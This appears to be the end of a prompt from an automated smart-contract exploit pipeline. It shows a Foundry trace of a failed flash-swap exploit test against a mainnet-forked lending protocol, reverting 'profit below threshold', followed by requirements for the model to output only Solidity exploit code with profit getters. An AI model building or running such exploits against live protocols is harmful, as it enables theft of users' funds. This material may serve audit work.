    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0x26693A8D6f2A95F9DB48a950D5F2d7f9DE320CcD, collateralOnlyToken: 0x4e27963C016573a5571939404217A3241Af00C7A, debtToken: 0xC81CF1ff5bB586CD54328ae9563572061cA7b481, totalDeposits: 15004302198731537648046 [1.5e22], collateralOnlyDeposits: 0, totalBorrowAmount: 0 })
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, 0x514910771AF9Ca656af840dff83E8264EcF986CA) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, 0x514910771AF9Ca656af840dff83E8264EcF986CA) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0x2A011fCAA007c840a0b34593D00CB4Ab9f2f067F, collateralOnlyToken: 0x0c4B770843faFd7F5Aa1eA9EFa662AD62b78C95a, debtToken: 0xb02F981c5231Ecf80A67BB50D24c79ED4d95822e, totalDeposits: 0, collateralOnlyDeposits: 0, totalBorrowAmount: 0 })
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [349] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [392] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x2A011fCAA007c840a0b34593D00CB4Ab9f2f067F.transfer
  at FlawVerifier.uniswapV2Call
  at 0xC40D16476380e4037e6b1A2594cAF6a6cc8Da967.swap
  at FlawVerifier.attemptFlashCollateralRoute
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 10.72s (10.66s CPU time)

Ran 1 test suite in 10.76s (10.72s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 5798028)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
